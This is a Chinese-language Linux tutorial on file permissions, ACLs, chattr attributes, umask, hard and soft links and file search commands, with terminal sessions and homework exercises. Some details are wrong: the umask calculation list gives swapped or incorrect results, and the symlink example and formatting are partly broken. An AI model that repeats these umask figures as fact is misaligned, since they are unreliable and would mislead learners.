<h3 id="文件访问控制列表-ACL"><a href="#文件访问控制列表-ACL" class="headerlink" title="文件访问控制列表 ACL"></a>文件访问控制列表 ACL</h3><p>不知大家有没有发现其实上面讲解的 rwx 权限、特殊权限、隐藏权限都是对某一类用户设置的,而如果希望对某个指定的用户进行单独的权限设置,那么就需要用文件的访问控制列表来实现啦。</p>
<p>我们可以基于普通文件或目录设置进行设置 ACL ,通俗来说 ACL 就是设置指定的特定用户或用户组对某个文件的操作权限。并且如果对某个目录设置了访问控制策略,那么子文件则继承其访问策略,而若对文件设置了访问控制策略则不再继承上级目录的控制策略。</p>
<p>ACL:Access Control List 缩写 ,UGO 的 rwx 权限以外的细部权限设置。</p>
<ul>
<li>setfacl 命令用于增加或者修改 ACL 规则,格式为: ” setfacl [ 参数 ] 文件 ” 。</li>
<li>getfacl 命令用于显示文件的 ACL 规则,格式为: ” getfacl 文件 ” 。</li>
</ul>
<p>详细命令用法请看第三章节。</p>
<h2 id="文件相关的命令"><a href="#文件相关的命令" class="headerlink" title="文件相关的命令"></a>文件相关的命令</h2><table>
<thead>
<tr>
<th align="left">文件</th>
<th align="left">命令</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">文件的管理</td>
<td align="left">ls ,cd, pwd, touch,mkdir, rmdir</td>
<td align="left">新建、删除</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">cp, rm, mv</td>
<td align="left">复制、删除、移动</td>
</tr>
<tr>
<td align="left">文件内容的查看</td>
<td align="left">cat, tac, nl</td>
<td align="left">直接查看内容</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">more, less</td>
<td align="left">可翻页查看</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">head, tail</td>
<td align="left">资料撷取</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">od</td>
<td align="left">非纯文本档</td>
</tr>
<tr>
<td align="left">文件的权限</td>
<td align="left">chmod chown</td>
<td align="left">文件的拥有者和所属组 ugo 权限</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">umask</td>
<td align="left">文件预设</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">chattr, lsattr</td>
<td align="left">文件隐藏属性</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">SUID, SGID, SBIT</td>
<td align="left">文件特殊权限</td>
</tr>
<tr>
<td align="left">文件类型</td>
<td align="left">file</td>
<td align="left">文件类型查看</td>
</tr>
<tr>
<td align="left">文件的搜索</td>
<td align="left">which</td>
<td align="left">指令文件的搜索</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">whereis, locate, find</td>
<td align="left">文件的搜索</td>
</tr>
</tbody></table>
<h3 id="权限的修改-chmod-chown-chgrp-umask"><a href="#权限的修改-chmod-chown-chgrp-umask" class="headerlink" title="权限的修改 chmod chown chgrp umask"></a>权限的修改 chmod chown chgrp umask</h3><h4 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h4><p>chmod [ u g o a 所有用户 ] [ + - = ] [ rwx] /[ 777]</p>
<ul>
<li>w 结合 x 权限可以对目录下的文件进行以下操作 : cd rm touch cp</li>
<li>r 结合 x 权限可以对目录下的文件进行 ls 操作</li>
<li>x 决定了能否进入目录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www tmp]# ll dabao</span><br><span class="line">-rw-r--r--. 1 root root 0 Mar 21 06:09 dabao</span><br><span class="line">[ root@www tmp]# chmod 777 dabao</span><br><span class="line">[ root@www tmp]# ll dabao</span><br><span class="line">-rwxrwxrwx. 1 root root 0 Mar 21 06:09 dabao3.1.2 chown</span><br></pre></td></tr></table></figure>

<p>chown user:group 目录 / 文件</p>
<p>-R 针对目录递归修改拥有者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www tmp]# chown dabao. dabao</span><br><span class="line">[ root@www tmp]# ll dabao</span><br><span class="line">-rwxrwxrwx. 1 dabao dabao 0 Mar 21 06:09 dabao</span><br><span class="line">[ root@www tmp]# chown -R dabao dabao1</span><br><span class="line">[ root@www tmp]# ll -R dabao1</span><br><span class="line">dabao1:</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x. 3 dabao root 4096 Mar 21 06:11 1</span><br><span class="line">dabao1/1:</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x. 2 dabao root 4096 Mar 21 06:11 2</span><br><span class="line">dabao1/1/2:</span><br><span class="line">total 0</span><br></pre></td></tr></table></figure>

<h4 id="chgrp"><a href="#chgrp" class="headerlink" title="chgrp"></a>chgrp</h4><p>修改文件目录的所属组</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www tmp]# chgrp -R dabao dabao1</span><br><span class="line">[ root@www tmp]# ll -R dabao1</span><br><span class="line">dabao1:</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x. 3 dabao dabao 4096 Mar 21 06:11 1</span><br><span class="line">dabao1/1:</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x. 2 dabao dabao 4096 Mar 21 06:11 2</span><br><span class="line">dabao1/1/2:</span><br><span class="line">total 0</span><br></pre></td></tr></table></figure>

<h4 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h4><p>umask 创建文件 / 目录的默认权限</p>
<p>公式</p>
<p>最大权限 -umask= 默认权限</p>
<ul>
<li>user 文件 666 -002 = 644 rw-rw-r–</li>
<li>root 文件 666 -022 = 664 rw-r–r–</li>
<li>user 目录 777 -002 = 755 rwxrwxr-x</li>
<li>root 目录 777 -022 = 775 rwxr-xr-x</li>
</ul>
<p>umask 777 只针对当前环境临时生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www tmp]# umask</span><br><span class="line">0022</span><br></pre></td></tr></table></figure>

<h4 id="相关文档-etc-profile-bash-profile"><a href="#相关文档-etc-profile-bash-profile" class="headerlink" title="相关文档 /etc/profile ~/.bash_profile"></a>相关文档 /etc/profile ~/.bash_profile</h4><ul>
<li>/etc/profile 定义了普通用户和 root 用户的 umask 值 , 对所有用户生效</li>
<li>~/.bash_profile 可以定义当前用户的 umask 值 , 只对当前用户生效 , 需要重新登陆用户后生效。</li>
</ul>
<p>默认属性相加减 , 则档案变成 :666-003=663, 是 -rw-rw–wx , 错 !!</p>
<h3 id="ATTR-权限命令-chattr-lsattr"><a href="#ATTR-权限命令-chattr-lsattr" class="headerlink" title="ATTR 权限命令 chattr lsattr"></a>ATTR 权限命令 chattr lsattr</h3><h4 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h4><p>配置文件案隐藏属性</p>
<p>属性设置常见的是 a 和 i 的设定 , 必须要 root 身份</p>
<p>chattr [ +-= ][ ASacdistu] 文件 / 目录</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">+</td>
<td align="left">增加</td>
</tr>
<tr>
<td align="left">-</td>
<td align="left">移除</td>
</tr>
<tr>
<td align="left">=</td>
<td align="left">设定为</td>
</tr>
<tr>
<td align="left">A</td>
<td align="left">访问时间 atime 不修改 , 对速度较慢计算机有帮助</td>
</tr>
<tr>
<td align="left">S</td>
<td align="left">『同步』写入磁盘</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">只能增加数据 , 不能删除 / 修改数据 (root)</td>
</tr>
<tr>
<td align="left">c</td>
<td align="left">自动『压缩』 , 读取时自动解压缩</td>
</tr>
<tr>
<td align="left">d</td>
<td align="left">不被 dump 备份</td>
</tr>
<tr>
<td align="left">i</td>
<td align="left">以下操作不可执行 : 『删除、改名、设置连结、写入、新增资料』 ( root )</td>
</tr>
<tr>
<td align="left">s</td>
<td align="left">彻底删除 , 无法挽回</td>
</tr>
<tr>
<td align="left">u</td>
<td align="left">与 s 相反 , 删除可挽回</td>
</tr>
</tbody></table>
<h4 id="lsattr"><a href="#lsattr" class="headerlink" title="lsattr"></a>lsattr</h4><p>lsattr [ -adR] 文件 / 目录</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-a</td>
<td align="left">显示隐藏文件的属性</td>
</tr>
<tr>
<td align="left">-d</td>
<td align="left">仅列出目录本身属性</td>
</tr>
<tr>
<td align="left">-R</td>
<td align="left">连同子目录</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A 访问时间 atime 不修改</span><br><span class="line">[root@rhel7 tmp]# chattr +A file1</span><br><span class="line">[root@rhel7 tmp]# lsattr file1</span><br><span class="line">-------A-------- file1</span><br><span class="line">[root@rhel7 tmp]# cat file1</span><br><span class="line">hi</span><br><span class="line">[root@rhel7 tmp]# stat file1</span><br><span class="line">File: ‘file1’</span><br><span class="line">Size: 3</span><br><span class="line">Blocks: 8</span><br><span class="line">IO Block: 4096 regular file</span><br><span class="line">Device: fd00h/64768d</span><br><span class="line">Inode: 52973916 Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)</span><br><span class="line">Context: unconfined_u:object_r:user_tmp_t:s0Access: 2016-06-22 14:49:50.221000000 +0800</span><br><span class="line">Modify: 2016-06-22 14:49:48.025000000 +0800</span><br><span class="line">Change: 2016-06-22 14:50:14.621000000 +0800</span><br><span class="line">Birth: -</span><br><span class="line">[root@rhel7 tmp]# cat file1</span><br><span class="line">hi</span><br><span class="line">[root@rhel7 tmp]# stat file1</span><br><span class="line">File: ‘file1’</span><br><span class="line">Size: 3</span><br><span class="line">Blocks: 8</span><br><span class="line">IO Block: 4096 regular file</span><br><span class="line">Device: fd00h/64768d</span><br><span class="line">Inode: 52973916 Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)</span><br><span class="line">Context: unconfined_u:object_r:user_tmp_t:s0</span><br><span class="line">Access: 2016-06-22 14:49:50.221000000 +0800</span><br><span class="line">Modify: 2016-06-22 14:49:48.025000000 +0800</span><br><span class="line">Change: 2016-06-22 14:50:14.621000000 +0800</span><br><span class="line">Birth: -</span><br><span class="line">[root@rhel7 tmp]# chattr -A file1</span><br><span class="line">a 只能增加数据 , 不能删除 / 修改数据 (root)</span><br><span class="line">[root@rhel7 tmp]# chattr +a file1</span><br><span class="line">[root@rhel7 tmp]# lsattr file1</span><br><span class="line">-----a---------- file1</span><br><span class="line">[root@rhel7 tmp]# echo 99 &gt; file1</span><br><span class="line">-bash: file1: Operation not permitted</span><br><span class="line">[root@rhel7 tmp]# echo 99 &gt;&gt; file1</span><br><span class="line">[root@rhel7 tmp]# cat file1</span><br><span class="line">hi</span><br><span class="line">99</span><br><span class="line">i 以下操作不可执行 : 『删除、改名、设置连结、写入、新增资料』 ( root )</span><br><span class="line">[root@rhel7 tmp]# chattr +i file1</span><br><span class="line">[root@rhel7 tmp]# rm -rf file1</span><br><span class="line">rm: cannot remove ‘file1’: Operation not permitted</span><br><span class="line">[root@rhel7 tmp]# mv file1 file100</span><br><span class="line">mv: cannot move ‘file1’ to ‘file100’: Operation not permitted</span><br><span class="line">[root@rhel7 tmp]# link file1 file1h</span><br><span class="line">link: cannot create link ‘file1h’ to ‘file1’: Operation not permitted</span><br><span class="line">[root@rhel7 tmp]# echo nini&gt;&gt;file1</span><br><span class="line">-bash: file1: Permission denied</span><br><span class="line">[root@rhel7 tmp]# chattr -i file1</span><br><span class="line">[root@rhel7 tmp]# lsattr file1</span><br><span class="line">---------------- file1</span><br></pre></td></tr></table></figure>


<h3 id="ACL-权限命令"><a href="#ACL-权限命令" class="headerlink" title="ACL 权限命令"></a>ACL 权限命令</h3><h4 id="ACL-权限概念"><a href="#ACL-权限概念" class="headerlink" title="ACL 权限概念"></a>ACL 权限概念</h4><p>ACL:Access Control List 缩写 ,UGO 的 rwx 权限以外的细部权限设置。</p>
<p>ACL 可以针对单一用户 , 单一文件 , 单一目录 r,w,x 的权限规范</p>
<p>针对几个项目 :</p>
<ol>
<li>使用者 (user): 可以针对使用者设定权限</li>
<li>群组 (group): 针对群组为对象设定权限</li>
<li>默认属性 (mask): 还可以针对在该目录下在建立新档案或目录时 , 规范新数据的默认权限</li>
</ol>
<h4 id="getfacl"><a href="#getfacl" class="headerlink" title="getfacl"></a>getfacl</h4><p>取得文件 / 目录的 ACL 设定内容</p>
<p>getfacl filename</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www tmp]# getfacl dabao</span><br><span class="line"> file: dabao</span><br><span class="line"> owner: dabao</span><br><span class="line"> group: dabao</span><br><span class="line">user::rwx</span><br><span class="line">group::rwx</span><br><span class="line">other::rwx</span><br></pre></td></tr></table></figure>

<h4 id="setfacl"><a href="#setfacl" class="headerlink" title="setfacl"></a>setfacl</h4><p>设置文件 / 目录的 ACL 规范</p>
<p>setfacl [-bkRd] [{-m|-x} acl 参数 ] 目标文件名</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-m</td>
<td align="left">设置 acl 参数</td>
</tr>
<tr>
<td align="left">-x</td>
<td align="left">删除 acl 参数</td>
</tr>
<tr>
<td align="left">-b</td>
<td align="left">删除所有 acl 参数</td>
</tr>
<tr>
<td align="left">-k</td>
<td align="left">删除预设的 acl 参数</td>
</tr>
<tr>
<td align="left">-R</td>
<td align="left">递归设置 acl 参数</td>
</tr>
<tr>
<td align="left">-d</td>
<td align="left">设置『预设 acl 参数』只对目录有效 , 在该目录新建的数据会引用</td>
</tr>
</tbody></table>
<p>命令格式 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">『 u:[ 使用者账号列表 ]:[ rwx] 』 &lt;= = 针对特定用户</span><br><span class="line">『 g:[ 群组列表 ]:[rwx] 』 &lt;= = 针对特定用户组</span><br><span class="line">『 m:[ rwx] 』 &lt;= = 针对有效权限 mask</span><br><span class="line">『 d:[ ug]: 使用者列表 :[ rwx] 』 针对预设权限 , 属性将继承到次目录</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 tmp]# setfacl -m u:student:rwx file1</span><br><span class="line">[root@rhel7 tmp]# setfacl -m g:student:rw file1</span><br><span class="line">[root@rhel7 tmp]# getfacl file1</span><br><span class="line"> file: file1</span><br><span class="line"> owner: root</span><br><span class="line"> group: root</span><br><span class="line">user::rw-</span><br><span class="line">user:student:rwx</span><br><span class="line">group::r--</span><br><span class="line">group:student:rw-</span><br><span class="line">mask::rwx</span><br><span class="line">other::r--</span><br><span class="line">-d 针对预设权限 , 属性将继承到次目录</span><br><span class="line">[root@rhel7 tmp]# mkdir dabao</span><br><span class="line">[root@rhel7 tmp]# setfacl -d -m u:student:rwx dabao</span><br><span class="line">[root@rhel7 tmp]# getfacl dabao</span><br><span class="line"> file: dabao</span><br><span class="line"> owner: root</span><br><span class="line"> group: root</span><br><span class="line">user::rwx</span><br><span class="line">group::r-x</span><br><span class="line">other::r-x</span><br><span class="line">default:user::rwx</span><br><span class="line">default:user:student:rwx</span><br><span class="line">default:group::r-x</span><br><span class="line">default:mask::rwx</span><br><span class="line">default:other::r-x</span><br><span class="line">[root@rhel7 tmp]# ll dabao -d</span><br><span class="line">drwxr-xr-x+ 2 root root 6 Jun 22 15:09 dabao</span><br><span class="line">[root@rhel7 tmp]# touch dabao/kk</span><br><span class="line">[root@rhel7 tmp]# ll dabao</span><br><span class="line">total 4</span><br><span class="line">-rw-rw-r--+ 1 root root 0 Jun 22 15:10 kk</span><br><span class="line">[root@rhel7 tmp]# getfacl dabao/kk</span><br><span class="line"> file: dabao/kk</span><br><span class="line"> owner: root</span><br><span class="line"> group: root</span><br><span class="line">user::rw-</span><br><span class="line">user:student:rwx</span><br><span class="line">effective:rw-</span><br><span class="line">group::r-x</span><br><span class="line">effective:r--</span><br><span class="line">mask::rw-</span><br><span class="line">other::r--</span><br><span class="line"> 切换为 student 用户</span><br><span class="line">[student@rhel7 tmp]$ cd dabao</span><br><span class="line">[student@rhel7 dabao]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rw-rw-r--+ 1 root root 0 Jun 22 15:10 kk</span><br><span class="line">[student@rhel7 dabao]$ cat kk</span><br></pre></td></tr></table></figure>

<h2 id="文件存储结构"><a href="#文件存储结构" class="headerlink" title="文件存储结构"></a>文件存储结构</h2><p>Linux 操作系统的文件权限 (rwx) 与文件属性 ( 拥有者、群组、 时间参数等 ) , 文件系统会将这两部分<br>的数据分别存放在不同的区块 , 权限不属性放置到 inode 中 , 实际数据则放置到 data block 区块中。<br>另外 , 还有一个超级区块 (superblock) 会记录整个 文件系统的整体信息 , 包括 inode 和 block<br>的总量、使用量、剩余量等。</p>
<p><img src="pic/07.png" alt="07"></p>
<ul>
<li>文件的属性和权限数据 –&gt; 放置到 inode 4 号</li>
<li>文件数据的实际放置点为 2, 7, 13, 15 这四个 block 号码</li>
</ul>
<p>对于目录: inode 记录该目录的相关权限与属性 , 并记录分配到的那块 block 号码 ; 而 block 则<br>是记录在该目录下的文件或目录的文件名和对应的 inode 号的数据。如下图所示:</p>
<p><img src="pic/08.png" alt="08"></p>
<h2 id="软硬方式链接"><a href="#软硬方式链接" class="headerlink" title="软硬方式链接"></a>软硬方式链接</h2><p>在 Linux 系统中的 ln 命令能够让用户创建出两种不同类型的文件快捷方式,一定要注意区分:</p>
<p>硬链接 (hard link) 可以被理解为一个 “ 指向原始文件 inode 的指针 ” ,系统不为它分配独立的 inode<br>与文件,所以实际上来讲硬链接文件与原始文件其实是同一个文件,只是名字不同。于是每添加一个硬链接,<br>该文件的 inode 连接数就会增加 1 ,直到该文件的 inode 连接数归 0 才是彻底删除。概括来说因为硬链<br>接实际就是指向原文件 inode 的指针,即便原始文件被删除依然可以通过链接文件访问,但是不能跨文件<br>系统也不能链接目录文件。</p>
<p>软链接也称为符号链接( symbolic link )即 “ 仅仅包含它索要链接文件的路径名 ” 因此能做目录链接也<br>可以跨越文件系统,但原始文件被删除后链接文件也将失效,如同 WinodwTM 中的 “ 快捷方式 ” 。</p>
<p>ln 命令用于创建链接文件,格式为: “ ln [ 选项 ] 目标 ” 。</p>
<ul>
<li>创建硬链接 :“ln 文件名 链接名 ”</li>
<li>创建软链接 :“ln -s 文件名 连接名 ”</li>
</ul>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-s</td>
<td align="left">创建”符号链接”(默认是硬链接)</td>
</tr>
<tr>
<td align="left">-f</td>
<td align="left">强制创建文件或目录的链接</td>
</tr>
<tr>
<td align="left">-i</td>
<td align="left">覆盖前先询问</td>
</tr>
<tr>
<td align="left">-v</td>
<td align="left">显示创建链接的过程</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 tmp]# echo this is a &gt; file</span><br><span class="line">[root@rhel7 tmp]# cat file</span><br><span class="line">this is a</span><br><span class="line">[root@rhel7 tmp]# ll file</span><br><span class="line">-rw-r--r--. 1 root root 10 Jun 22 16:02 file</span><br><span class="line">[root@rhel7 tmp]# ln file fileh</span><br><span class="line">[root@rhel7 tmp]# ll file fileh</span><br><span class="line">[root@rhel7 tmp]# ll file fileh files -i</span><br><span class="line">52973928 -rw-r--r--. 2 root root 10 Jun 22 16:02 file</span><br><span class="line">52973928 -rw-r--r--. 2 root root 10 Jun 22 16:02 fileh</span><br><span class="line">52973930 lrwxrwxrwx. 1 root root 4 Jun 22 16:03 files -&gt; filefile</span><br></pre></td></tr></table></figure>

<p><img src="pic/09.png" alt="09"></p>
<h2 id="指令和文件的搜索"><a href="#指令和文件的搜索" class="headerlink" title="指令和文件的搜索"></a>指令和文件的搜索</h2><p>which     whereis         locate     find </p>
<h3 id="肉眼查找-ls-R"><a href="#肉眼查找-ls-R" class="headerlink" title="肉眼查找 : ls -R"></a>肉眼查找 : ls -R</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www ~]# ls -R /tmp</span><br><span class="line">/tmp:</span><br><span class="line">dabao</span><br><span class="line">dabao1</span><br><span class="line">/tmp/dabao1:</span><br><span class="line">1</span><br><span class="line">/tmp/dabao1/1:</span><br><span class="line">2</span><br><span class="line">/tmp/dabao1/1/2:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 指令的搜寻 :which</span></span></span><br><span class="line"></span><br><span class="line">which [ -a] command</span><br><span class="line"></span><br><span class="line">选项与参数 :</span><br><span class="line"></span><br><span class="line">-a</span><br><span class="line">- : 将所有由 PATH 目录中可以找到的指令均列出</span><br><span class="line">- : 只显示第一个找到的</span><br><span class="line"></span><br><span class="line">注意 :</span><br><span class="line">1. 系统内建命令找不到 , type 查看</span><br><span class="line">2. alias 命令别名</span><br><span class="line"></span><br><span class="line">​```shell</span><br><span class="line">[ root@www ~]# which cat</span><br><span class="line">/bin/cat</span><br><span class="line">[ root@www ~]# which postfix</span><br><span class="line">/usr/sbin/postfix</span><br></pre></td></tr></table></figure>

<h3 id="文件名的搜寻-whereis-locate-find"><a href="#文件名的搜寻-whereis-locate-find" class="headerlink" title="文件名的搜寻 :whereis, locate, find"></a>文件名的搜寻 :whereis, locate, find</h3><h4 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h4><p>whereis [ -bmsu] [ -BMS directory…-f] filename..</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-b</td>
<td align="left">只寻找 binary 二进制 格式的文件</td>
</tr>
<tr>
<td align="left">-m</td>
<td align="left">只寻找在 说明文件 manual 路径下的文件</td>
</tr>
<tr>
<td align="left">-s</td>
<td align="left">只寻找 source 来源的文件</td>
</tr>
<tr>
<td align="left">-u</td>
<td align="left">搜寻不在上述三个项目当中的其他特殊文件</td>
</tr>
<tr>
<td align="left">-l</td>
<td align="left">查看 whereis 可搜寻的路径</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www ~]# whereis /etc/passwd</span><br><span class="line">passwd: /usr/bin/passwd /etc/passwd.OLD /etc/passwd /usr/share/man/man1/passwd.1.gz</span><br><span class="line">/usr/share/man/man5/passwd.5.gz</span><br><span class="line">[ root@www ~]# whereis man</span><br><span class="line">man: /usr/bin/man /etc/man.config /usr/share/man /usr/share/man/man7/man.7.gz</span><br><span class="line">/usr/share/man/man1p/man.1p.gz /usr/share/man/man1/man.1.gz</span><br></pre></td></tr></table></figure>

<h4 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h4><p>locate [ -ir] keyword</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-i</td>
<td align="left">忽略大小写的差异 ;</td>
</tr>
<tr>
<td align="left">-r</td>
<td align="left">后面可接正规表示法的显示方式</td>
</tr>
</tbody></table>
<ul>
<li>安装软件 <code>mlocate</code> 之后才会有 <code>updatedb</code> 命令和 <code>locate</code> 命令,最小化安装的 rhel 系统默认不安装。</li>
<li><code>locate</code> 寻找的数据是由『已建立的数据库 <code>/var/lib/mlocate/mlocate.db</code> 里面的数据所搜<br>寻到 , 所以不用直接在去硬盘中存取数据 , 速度快</li>
<li><code>updatedb</code>: 根据 <code>/etc/updatedb.conf</code> 的设定去搜寻系统硬盘内的文件名 , 并更新<code>/var/lib/mlocate.mlocate.db</code></li>
<li><code>PRUNEPATHS = &quot;/afs /media /net /sfs /tmp /udev /var/cache/ccache /var/spool/cups /var/spool/squid /var/tmp&quot;</code> &lt;== 设定了不搜寻的目录</li>
</ul>
<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>find [ PATH] [ option] [ action]</p>
<p>选项与参数 :</p>
<ol>
<li>与时间有关 :-atime, -ctime ,-mtime , 以 -mtime 说明</li>
</ol>
<ul>
<li>-mtime n</li>
<li>-mtime +n</li>
<li>-mtime -n</li>
<li>-newer file : 列出比 file 还要新的档案</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if n= 2 now= 2015/12/24</span><br><span class="line">then</span><br><span class="line">-mtime 2:  2015/12/22 当天内容改过的文件</span><br><span class="line">-mtime +2: 2 天之前 , 2015/12/22 之前被容被改过的文件 , 及 21\20\19...</span><br><span class="line">-mtime -2: 2 天以内 , 2015/12/24 和 2015/12/23 号修改过的文件</span><br><span class="line">&lt;--|--|--|--|--|--|--|--|--|--|--|2-|--|--|</span><br><span class="line">&lt;----------------------------+2-&gt;|--|--|--|</span><br><span class="line">&lt;--|--|--|--|--|--|--|--|--|--|--|--|&lt;-2-&gt;|</span><br><span class="line">11 12 13 14 15 16 17 18 19 20 21 22 23 24 现在</span><br></pre></td></tr></table></figure>

<ol>
<li>与用户和组有关</li>
</ol>
<ul>
<li>-uid n</li>
<li>-gid n</li>
<li>-user name</li>
<li>-group name</li>
<li>-nouser</li>
<li>-nogroup</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www ~]# find /tmp -user dabao</span><br><span class="line">/tmp/dabao</span><br><span class="line">/tmp/dabao1</span><br><span class="line">/tmp/dabao1/1</span><br><span class="line">/tmp/dabao1/1/2</span><br></pre></td></tr></table></figure>

<ol>
<li>与档案的权限及名称有关</li>
</ol>
<ul>
<li>-name filename: 搜寻文件名为 filename 的文件 ;</li>
<li>-size [ +-]SIZE: SIZE 的规格有</li>
<li>c: 代表 byte</li>
<li>k: 代表 1024bytes w: 字数 , 占两个字符 M\G</li>
<li>-type TYPE:f 普通文件 d 目录 l 链接文件</li>
<li>-perm mode : 文件权限『刚好等于』 mode 的档案 mode 范围 : 7777 ~ 0000</li>
<li>-perm -mode: 文件权限『必须要全部囊括 mode 权限』</li>
<li>-perm +mode: 文件权限『包含 mode 权限』的文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www ~]# find /tmp -name "*da*"</span><br><span class="line">/tmp/dabao</span><br><span class="line">/tmp/orbit-root/linc-bd3-0-5dc8fa181da</span><br><span class="line">/tmp/orbit-root/linc-da1-0-76ab0a1c521dd</span><br><span class="line">/tmp/orbit-root/linc-cc4-0-c0fda335ced5</span><br><span class="line">/tmp/dabao1</span><br><span class="line">[ root@www ~]# find /tmp -type f</span><br><span class="line">/tmp/pulse-BzLrQ7uHulwz/pid</span><br><span class="line">/tmp/.X0-lock</span><br><span class="line">/tmp/dabao</span><br><span class="line">/tmp/orbit-root/bonobo-activation-server-23d28d39cfff8983f6cac2ca00000055-ior</span><br><span class="line">/tmp/orbit-root/bonobo-activation-register-23d28d39cfff8983f6cac2ca00000055.lock</span><br><span class="line">/tmp/lurakm9.tmp/luraktg.tmp</span><br><span class="line">/tmp/lurakm9.tmp/lurakt2.tmp</span><br><span class="line">/tmp/lurakm9.tmp/lurakvs.tmp</span><br></pre></td></tr></table></figure>

<ol>
<li>额外动作</li>
</ol>
<p>-exec [ 命令 ] : 后面可再接额外的命令来处理搜寻到的结果</p>
<p><code>find / -perm +7000 -exec ls -l {} \;</code><br>&lt;= = 固定格式 : <code>find [ 路径 参数 ] -exec [ 命令 ] {} \;</code></p>
<p>-ok        格式同-exec，区别ok会带提示（交互式的找到后是否执行该命令）</p>
<p>-print: 将结果输出屏幕上 , 预设动作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ root@www ~]# find /tmp -name "dabao*" -exec ls -l &#123;&#125; \;</span><br><span class="line">-rwxrwxrwx+ 1 dabao dabao 0 Mar 21 06:09 /tmp/dabao</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x. 3 dabao dabao 4096 Mar 21 06:11 1</span><br></pre></td></tr></table></figure>

<h2 id="Linux-文件和目录作业"><a href="#Linux-文件和目录作业" class="headerlink" title="Linux 文件和目录作业"></a>Linux 文件和目录作业</h2><h3 id="UGO-权限作业"><a href="#UGO-权限作业" class="headerlink" title="UGO 权限作业"></a>UGO 权限作业</h3><ol>
<li>查看 /var/spool/mail 下所有文件 , 并指出其拥有者和所属组分 别是谁 , 其拥有者和所属组对应的<br>权限分别是什么 ?</li>
<li>在 /tmp/ 目录下创建 7 个目录 , 目录名分别为 test1 到 test7</li>
</ol>
<ul>
<li>1) 将该 7 个目录的拥有者改为 student 用户。</li>
<li>2) 在这 7 个目录下分别创建 file1 和 file2</li>
<li>3) 针对这 7 个目录的 student 用户分别设置数字为 1 到 7 的权限。</li>
<li>4) 分别对这个 7 个目录执行以下命令 :<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls file1</span><br><span class="line">ls -l file1</span><br><span class="line">cd testx</span><br><span class="line">touch file3</span><br><span class="line">rm file2</span><br><span class="line">chmod 777 file1</span><br></pre></td></tr></table></figure>
并总结结论。</li>
</ul>
<ol>
<li>新建一个组 , 组名为 group, 要求将 test1 目录的所属组改为 group 组 , 并将 test1 目录下的<br>所有文件的所属组都改为 group 组。</li>
</ol>
<h3 id="特殊权限作业"><a href="#特殊权限作业" class="headerlink" title="特殊权限作业"></a>特殊权限作业</h3><ol>
<li>在 /tmp/ 目录下创建一个 testdir 目录 , 要求任何人在该目录下 创建的文件都只能由自己或者目录<br>拥有者去删除 , 其余人不能够 去删除。</li>
<li>创建一个文件 , 让任何人执行这个文件时候 , 临时拥有文件拥 有者的权限。</li>
</ol>
<h3 id="ATTR-权限作业"><a href="#ATTR-权限作业" class="headerlink" title="ATTR 权限作业"></a>ATTR 权限作业</h3><ol>
<li>创建一个文件 , 文件名任意 , 要求 , 该文件的访问时间不被 修改 , 同时 , 该文件只能被追加内容 , 不允许被<br>修改和删除。 取消该文件的 Attr 权限。</li>
</ol>
